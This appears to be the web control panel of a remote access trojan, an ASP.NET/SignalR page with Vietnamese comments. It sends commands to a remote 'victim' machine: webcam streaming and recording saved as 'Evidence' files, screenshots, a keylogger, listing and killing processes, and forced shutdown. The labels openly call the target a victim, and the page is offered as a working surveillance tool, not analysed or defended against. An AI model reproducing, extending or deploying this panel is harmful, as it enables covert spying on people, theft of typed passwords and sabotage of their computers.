@{
    Layout = null; // Tắt Layout mặc định để dùng giao diện TemplateMo trọn vẹn
}

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Control Center - WebcamHub</title>

    <link rel="stylesheet" href="~/css/templatemo-graph-page.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <style>
        /* CSS chỉnh thêm cho Webcam vừa vặn với Card */
        .webcam-container {
            position: relative;
            width: 100%;
            text-align: center;
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            min-height: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #webcamCanvas {
            max-width: 100%;
            max-height: 500px;
            /* Lưu ý: Không dùng transform ở đây nữa vì đã lật bằng JS */
        }

        .control-panel {
            margin-top: 20px;
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .status-dot {
            font-size: 1.2rem;
            margin-bottom: 15px;
            font-family: monospace;
        }

        /* Chỉnh lại nút tắt khẩn cấp cho nổi bật */
        .btn-emergency {
            background: linear-gradient(135deg, #ff4b4b, #ff0000) !important;
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4) !important;
        }

        /* CSS cho bảng Task Manager */
        .task-table {
            width: 100%;
            border-collapse: collapse;
            color: #fff;
        }

            .task-table th {
                border-bottom: 2px solid #00ffcc;
                text-align: left;
                padding: 10px;
            }

            .task-table td {
                border-bottom: 1px solid rgba(255,255,255,0.1);
                padding: 8px;
            }

        .btn-kill {
            background: #ff4b4b;
            border: none;
            color: white;
            padding: 4px 10px;
            border-radius: 4px;
            cursor: pointer;
            transition: 0.3s;
        }

            .btn-kill:hover {
                background: #ff0000;
            }
    </style>
</head>
<body>
    <nav id="navbar">
        <div class="nav-container">
            <a href="#home" class="logo">
                <div class="logo-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" /></svg>
                </div>
                <span class="logo-text">Webcam Control</span>
            </a>
            <ul class="nav-links">
                <li><a href="#dashboard" class="active">Live Stream</a></li>
                <li><a href="#tasks">Tasks</a></li>
                <li><a href="#control">Controls</a></li>
                <li><a href="#logs">Output</a></li>
            </ul>
        </div>
    </nav>

    <section class="dashboard-section" id="dashboard" style="padding-top: 100px;">
        <div class="dashboard-container">
            <h2 class="section-title">Live Surveillance</h2>

            <div class="charts-grid" style="grid-template-columns: 1fr;">
                <div class="chart-card">
                    <div class="chart-header">
                        <h3 class="chart-title">
                            <span id="statusText" class="status-dot">
                                <span style="color: red;">●</span> Status: Disconnected
                            </span>
                        </h3>
                        <div class="chart-options">
                            <span style="color: #a0a0a0; margin-right: 10px;">Time (s):</span>
                            <input type="number" id="autoDuration" value="10" min="5"
                                   style="background: rgba(255,255,255,0.1); border: 1px solid #00ffcc; color: white; padding: 5px; width: 60px; text-align: center; border-radius: 5px;">
                        </div>
                    </div>

                    <div class="chart-container" style="height: auto;">
                        <div class="webcam-container">
                            <canvas id="webcamCanvas" style="display: none; box-shadow: 0 0 20px #00ffcc;"></canvas>

                            <div id="placeholder" style="color: #a0a0a0;">
                                <i class="fas fa-video-slash fa-4x mb-3"></i>
                                <h3 style="margin-top: 20px;">Waiting for connection...</h3>
                            </div>
                        </div>

                        <div class="control-panel">
                            <button id="btnAutoStart" onclick="runAutoProcess()" class="cta-button" disabled>
                                <i class="fas fa-spinner fa-spin"></i> CONNECTING...
                            </button>

                            <button id="btnManualSave" onclick="saveVideoManually()" class="cta-button" style="display:none; background: linear-gradient(135deg, #ffd700, #ffa500);">
                                <i class="fas fa-download"></i> SAVE VIDEO
                            </button>

                            <button id="btnEmergencyStop" onclick="stopWebcamImmediately()" class="cta-button btn-emergency">
                                <i class="fas fa-stop-circle"></i> STOP CAM
                            </button>
                        </div>

                        <p id="timerLabel" style="text-align: center; color: #ffcc00; font-weight: bold; margin-top: 15px; font-size: 1.2em; display: none;"></p>
                    </div>
                </div>
            </div>

            <div class="chart-card" id="tasks" style="margin-top: 30px;">
                <div class="chart-header">
                    <h3 class="chart-title">Task Manager</h3>
                    <div class="chart-options">
                        <button onclick="sendCommand('APPLICATION')" class="chart-option" style="background: #17a2b8; color: white;">Get Apps</button>
                        <button onclick="sendCommand('PROCESS')" class="chart-option" style="background: #6c757d; color: white;">Get Processes</button>
                    </div>
                </div>

                <div class="chart-container" style="height: auto; max-height: 400px; overflow-y: auto;">
                    <table class="task-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>NAME</th>
                                <th>DETAILS</th>
                                <th>ACTION</th>
                            </tr>
                        </thead>
                        <tbody id="tableBody">
                            <tr><td colspan="4" style="padding: 20px; text-align: center; color: #707070;">No data loaded... Click buttons above.</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="stats-grid" id="control" style="margin-top: 40px;">
                <div class="stat-card" onclick="sendCommand('TAKEPIC')" style="cursor: pointer;">
                    <div class="stat-header">
                        <div class="stat-icon"><i class="fas fa-camera"></i></div>
                        <div class="stat-title">Screenshot</div>
                    </div>
                    <div class="stat-description">Take a picture immediately.</div>
                </div>

                <div class="stat-card" onclick="sendCommand('KEYLOG')" style="cursor: pointer;">
                    <div class="stat-header">
                        <div class="stat-icon"><i class="fas fa-keyboard"></i></div>
                        <div class="stat-title">Start Keylogger</div>
                    </div>
                    <div class="stat-description">Capture keystrokes from target.</div>
                </div>

                <div class="stat-card" onclick="confirmShutdown()" style="cursor: pointer;">
                    <div class="stat-header">
                        <div class="stat-icon" style="background: linear-gradient(135deg, #ff6b6b, #ff0000);"><i class="fas fa-power-off"></i></div>
                        <div class="stat-title">Shutdown PC</div>
                    </div>
                    <div class="stat-description">Turn off victim's computer.</div>
                </div>
            </div>

            <div class="chart-card" id="logs" style="margin-top: 30px;">
                <div class="chart-header">
                    <h3 class="chart-title">Data Output</h3>
                </div>
                <div class="chart-container" style="height: auto; min-height: 200px;">
                    <textarea id="txtKeylog" rows="8" style="width: 100%; background: #0f1329; color: #00ffcc; border: 1px solid #333; padding: 10px; font-family: monospace; display: none;" readonly></textarea>

                    <div id="screenshotArea" style="display:none; text-align: center;">
                        <img id="imgScreenshot" src="" style="max-width: 100%; border: 2px solid white; border-radius: 5px;" />
                        <br />
                        <a id="btnDownload" href="#" download="screenshot.png" class="cta-button" style="margin-top: 15px; display: inline-block;">Download Image</a>
                    </div>
                </div>
            </div>

        </div>
    </section>

    <footer>
        <div class="footer-content">
            <p class="copyright">© 2025 Webcam Remote Tool. All rights reserved.</p>
        </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/microsoft-signalr/6.0.1/signalr.min.js"></script>

    <script src="~/js/templatemo-graph-script.js"></script>

    <script>
        // --- KHAI BÁO BIẾN TOÀN CỤC ---
        var canvas = document.getElementById("webcamCanvas");
        var ctx = canvas.getContext("2d");
        var imgObj = new Image();

        var mediaRecorder;
        var recordedChunks = [];
        var countdown; // Biến toàn cục để xử lý đếm giờ
        var isRecording = false;
        var hasVideoData = false;
        var isWaitingForImageToRecord = false;
        var recordDurationConfig = 10;

        // Khởi tạo SignalR
        var connection = new signalR.HubConnectionBuilder()
            .withUrl("/webcamHub")
            .withAutomaticReconnect()
            .build();

        // --- CÁC HÀM GIAO DIỆN (UI) ---
        function setOnlineState() {
            var btnStart = document.getElementById("btnAutoStart");
            if (btnStart) {
                btnStart.disabled = false;
                btnStart.innerHTML = '<i class="fas fa-play"></i> START STREAM';
            }
        }

        function setOfflineState() {
            var status = document.getElementById("statusText");
            if (status) {
                status.innerHTML = '<span style="color: red;">●</span> Status: Disconnected';
            }
            var btnStart = document.getElementById("btnAutoStart");
            if (btnStart) {
                btnStart.disabled = true;
                btnStart.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CONNECTING...';
            }
        }

        // --- LOGIC NHẬN ẢNH (Đã fix lỗi cú pháp & mirror) ---
        connection.on("ReceiveImage", function (base64Data) {
            var placeholder = document.getElementById("placeholder");
            var status = document.getElementById("statusText");

            // Ẩn placeholder, hiện canvas
            placeholder.style.display = "none";
            canvas.style.display = "inline-block";

            // Cập nhật trạng thái
            status.innerHTML = '<span style="color: #00ff00;">●</span> Status: Live Stream';

            // Logic bắt đầu quay khi nhận ảnh đầu tiên
            if (isWaitingForImageToRecord) {
                isWaitingForImageToRecord = false;
                startRecordingInternal(recordDurationConfig);
            }

            // Load và vẽ ảnh
            imgObj.onload = function () {
                if (canvas.width !== imgObj.width) {
                    canvas.width = imgObj.width;
                    canvas.height = imgObj.height;
                }
                // Lật ảnh (Mirror)
                ctx.save();
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(imgObj, 0, 0, canvas.width, canvas.height);
                ctx.restore();
            };

            imgObj.src = "data:image/jpeg;base64," + base64Data;
        });

        // --- HÀM START QUAY ---
        function runAutoProcess() {
            if (hasVideoData) {
                let choice = confirm("Video cũ chưa lưu sẽ bị xóa. Tiếp tục?");
                if (!choice) return;
            }

            var duration = document.getElementById("autoDuration").value;
            if (duration < 3) duration = 5;
            recordDurationConfig = parseInt(duration) + 1; // Cộng bù giờ

            hasVideoData = false;
            recordedChunks = [];

            document.getElementById("btnManualSave").style.display = "none";
            document.getElementById("btnAutoStart").disabled = true;
            document.getElementById("btnAutoStart").innerHTML = "Sending Command...";

            sendCommand('WEBCAM');
            setTimeout(() => sendCommand('0'), 100);

            isWaitingForImageToRecord = true;

            // Timeout an toàn
            setTimeout(function () {
                if (isWaitingForImageToRecord) {
                    alert("No response from victim!");
                    isWaitingForImageToRecord = false;
                    document.getElementById("btnAutoStart").disabled = false;
                    document.getElementById("btnAutoStart").innerHTML = '<i class="fas fa-play"></i> START STREAM';
                }
            }, 15000);
        }

        // --- HÀM GHI HÌNH (INTERNAL) ---
        function startRecordingInternal(seconds) {
            if (canvas.width < 100) return;

            // Cấu hình Bitrate
            var options = { mimeType: 'video/webm', videoBitsPerSecond: 3000000 };
            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                options.mimeType = 'video/webm;codecs=vp9';
            }

            var stream = canvas.captureStream(30);
            mediaRecorder = new MediaRecorder(stream, options);

            mediaRecorder.ondataavailable = function (e) {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };

            mediaRecorder.onstop = function () {
                sendCommand('QUIT');
                hasVideoData = true;
                isRecording = false;

                document.getElementById("btnManualSave").style.display = "inline-block";
                document.getElementById("btnAutoStart").disabled = false;
                document.getElementById("btnAutoStart").innerHTML = '<i class="fas fa-redo"></i> RESTART';
                document.getElementById("timerLabel").style.display = "none";
            };

            mediaRecorder.start(1000);
            isRecording = true;

            var timeLeft = seconds;
            var timerLbl = document.getElementById("timerLabel");
            timerLbl.style.display = "block";

            // BỘ ĐẾM GIỜ (Sử dụng biến toàn cục countdown)
            countdown = setInterval(function () {
                timeLeft--;
                timerLbl.innerText = "Recording: " + timeLeft + "s";
                document.getElementById("btnAutoStart").innerHTML = "Recording " + timeLeft + "s";

                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    if (mediaRecorder.state === "recording") mediaRecorder.stop();
                }
            }, 1000);
        }

        // --- HÀM TẮT CAM KHẨN CẤP (Đã fix lỗi UI) ---
        function stopWebcamImmediately() {
            if (typeof countdown !== 'undefined') clearInterval(countdown);

            var timerLbl = document.getElementById("timerLabel");
            timerLbl.innerText = "";
            timerLbl.style.display = "none";

            sendCommand('QUIT');

            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
            }

            isRecording = false;
            isWaitingForImageToRecord = false;

            document.getElementById("webcamCanvas").style.display = "none";
            document.getElementById("placeholder").style.display = "block";
            document.getElementById("statusText").innerHTML = '<span style="color: cyan;">●</span> Status: Connected (Idle)';

            var btnStart = document.getElementById("btnAutoStart");
            btnStart.disabled = false;
            btnStart.innerHTML = '<i class="fas fa-play"></i> START STREAM';

            // Hiện nút lưu để vớt vát video
            document.getElementById("btnManualSave").style.display = "inline-block";
        }

        // --- HÀM TẢI VIDEO ---
        function saveVideoManually() {
            if (!hasVideoData || recordedChunks.length === 0) {
                alert("No video data!");
                return;
            }
            var blob = new Blob(recordedChunks, { type: "video/webm" });
            var url = URL.createObjectURL(blob);
            var a = document.createElement("a");
            document.body.appendChild(a);
            a.style = "display: none";
            a.href = url;
            a.download = "Evidence_" + new Date().getTime() + ".webm";
            a.click();
            window.URL.revokeObjectURL(url);
        }

        // --- CÁC HÀM KHÁC ---
        function sendCommand(cmd) {
            connection.invoke("SendCommand", cmd).catch(err => console.error(err.toString()));
        }

        function confirmShutdown() {
            if (confirm("Confirm SHUTDOWN victim PC?")) {
                sendCommand('SHUTDOWN');
            }
        }

        // --- LOGIC XỬ LÝ TASK MANAGER (Process List) ---
        connection.on("ReceiveListData", function (jsonString) {
            try {
                var data = JSON.parse(jsonString);
                var html = "";
                data.forEach(item => {
                    html += `
                            <tr>
                                <td>${item.id}</td>
                                <td style="color: #00ffcc; font-weight:bold;">${item.name}</td>
                                <td style="color: #a0a0a0;">${item.details}</td>
                                <td>
                                    <button onclick="killProcess(${item.id})" class="btn-kill">KILL</button>
                                </td>
                            </tr>`;
                });
                document.getElementById("tableBody").innerHTML = html;
            } catch (e) {
                console.error("Parse Error:", e);
            }
        });

        function killProcess(id) {
            if (confirm("Force KILL process ID: " + id + "?")) {
                sendCommand("KILLID|" + id);
            }
        }

        // --- XỬ LÝ ẢNH CHỤP VÀ KEYLOG ---
        connection.on("ReceiveKeylog", function (textData) {
            document.getElementById("screenshotArea").style.display = "none";
            var txt = document.getElementById("txtKeylog");
            txt.style.display = "block";
            txt.value += textData + "\n";
            txt.scrollTop = txt.scrollHeight;
        });

        connection.on("ReceiveScreenshot", function (base64Img) {
            document.getElementById("txtKeylog").style.display = "none";
            document.getElementById("screenshotArea").style.display = "block";
            var img = document.getElementById("imgScreenshot");
            var btn = document.getElementById("btnDownload");
            img.src = "data:image/png;base64," + base64Img;
            btn.href = img.src;
        });

        // --- BẮT ĐẦU KẾT NỐI ---
        async function startSignalR() {
            try {
                await connection.start();
                console.log("SignalR Connected.");
                document.getElementById("statusText").innerHTML = '<span style="color: cyan;">●</span> Status: Connected (Idle)';
                setOnlineState();
            } catch (err) {
                console.error(err);
                setOfflineState();
                setTimeout(startSignalR, 5000);
            }
        }
        startSignalR();

    </script>
</body>
</html>